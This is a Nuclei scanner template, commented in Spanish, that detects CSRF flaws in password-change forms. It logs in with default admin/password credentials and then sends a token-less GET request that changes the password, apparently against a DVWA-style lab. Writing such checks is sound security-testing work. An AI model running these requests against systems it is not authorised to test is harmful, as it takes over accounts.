id: CSRF_VALIDADO

info:
  name: CSRF - Cambio de contrase単a sin token
  severity: high
  author: Fabian Morales
  description: |
    Detecta vulnerabilidades CSRF en funcionalidades de cambio de contrase単a
    que no implementan tokens anti-CSRF.
  reference:
    - https://owasp.org/www-community/attacks/csrf
  tags: csrf,web,security,auth

variables:
  new_password: "contrase単a"

http:
  - raw:
      - |
        GET /login HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0

      - |
        POST /login HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        User-Agent: Mozilla/5.0

        username=admin&password=password&Login=Login

      - |
        GET /csrf/ HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0

      - |
        GET /csrf/?password_new=password&password_conf=password&Change=Change HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0

    cookie-reuse: true
    matchers:
      - type: word
        words:
          - "Password Changed"
          - "contrase単a cambiada"
          - "password changed"
          - "successfully changed"
        part: body
        condition: or

    extractors:
      - type: regex
        name: csrf_token
        part: body
        regex:
          - 'name="user_token" value="([a-f0-9]{32})"'
          - 'csrf_token" value="([^"]+)"'
        group: 1